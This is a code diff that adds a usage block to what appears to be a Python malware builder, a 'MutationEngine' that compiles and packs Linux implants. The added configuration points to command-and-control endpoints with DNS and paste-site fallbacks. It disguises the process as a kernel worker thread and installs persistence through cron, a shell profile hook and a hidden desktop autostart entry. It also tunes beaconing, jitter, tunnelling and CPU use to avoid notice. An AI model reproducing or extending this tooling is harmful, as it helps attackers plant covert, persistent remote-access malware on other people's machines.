@@ -289,3 +289,33 @@ void _start(void) {{
         self.substitute_patterns()
         self.rename_internal_symbols()
         self.compile_and_pack(output_path)
+# ── Usage ──
+
+if __name__ == '__main__':
+    agent_config = {
+        'c2_url':             'https://cdn-assets-eu.example.com/api/v2/telemetry',
+        'c2_fallback_dns':    'update.cdn-telemetry.example.com',
+        'c2_fallback_paste':  'https://paste.example.com/raw/aB3xK9mQ',
+        'proc_name':          'kworker/3:0',
+        'proc_cmdline':       '[kworker/3:0-events_unbound]',
+        'cron_entry':         '*/5 * * * * ~/.local/lib/dbus-session-helper >/dev/null 2>&1',
+        'profile_hook':       '[ -f ~/.local/lib/dbus-session-helper ] && nohup ~/.local/lib/dbus-session-helper >/dev/null 2>&1 &',
+        'xdg_desktop': (
+            '[Desktop Entry]\n'
+            'Type=Application\n'
+            'Name=D-Bus Session Helper\n'
+            'Exec=%h/.local/lib/dbus-session-helper\n'
+            'Hidden=true\n'
+            'NoDisplay=true\n'
+            'X-GNOME-Autostart-enabled=true\n'
+        ),
+        'agent_id':           hashlib.sha256(os.urandom(32)).hexdigest(),
+        'beacon_base_sec':    300,
+        'beacon_jitter':      0.3,
+        'tunnel_port':        19228,
+        'max_cpu_pct':        40,
+    }
+
+    engine = MutationEngine(agent_config, cert_der_path='c2_cert.der')
+    engine.generate(sys.argv[1] if len(sys.argv) > 1 else 'agent_out')
+    
